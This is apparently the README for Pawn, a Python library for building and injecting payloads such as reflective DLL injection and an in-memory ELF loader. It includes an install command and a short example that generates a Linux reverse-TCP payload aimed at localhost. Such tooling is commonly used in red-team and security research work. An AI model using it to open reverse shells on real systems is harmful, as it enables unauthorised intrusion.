# Pawn

[![Developer](https://img.shields.io/badge/developer-EntySec-blue.svg)](https://entysec.com)
[![Language](https://img.shields.io/badge/language-Python-blue.svg)](https://github.com/EntySec/Pawn)
[![Forks](https://img.shields.io/github/forks/EntySec/Pawn?style=flat&color=green)](https://github.com/EntySec/Pawn/forks)
[![Stars](https://img.shields.io/github/stars/EntySec/Pawn?style=flat&color=yellow)](https://github.com/EntySec/Pawn/stargazers)
[![CodeFactor](https://www.codefactor.io/repository/github/EntySec/Pawn/badge)](https://www.codefactor.io/repository/github/EntySec/Pawn)

Pawn is a collection of Python techniques used for crafting, manipulating and injecting payloads.

## Features

* Support for `Windows`, `macOS`, `Linux` and `Apple iOS` payloads.
* Support for such techniques like `Reflective DLL Injection` and `procfs loader`.
* Has modular system which allows you to write your own custom payloads.

## Installation

```
pip3 install git+https://github.com/EntySec/Pawn
```

## Examples

Example of obtaining [ELF procfs loader](https://blog.entysec.com/2023-04-02-remote-elf-loading/) with custom host and port.

```python
from pawn import Pawn

pawn = Pawn()

module = pawn.get_pawn(
    module='linux/x64/reverse_tcp_memfd',
    platfrom='linux',
    arch='x64',
    type='reverse_tcp'
)

module.set('host', '127.0.0.1')
module.set('port', 8888)

payload = pawn.run_pawn(module)
print(len(payload))
```

## Special Thanks

* Some parts of **assembly code for Windows** were ported from free open-source project [Metasploit Framework](https://github.com/rapid7/metasploit-framework).
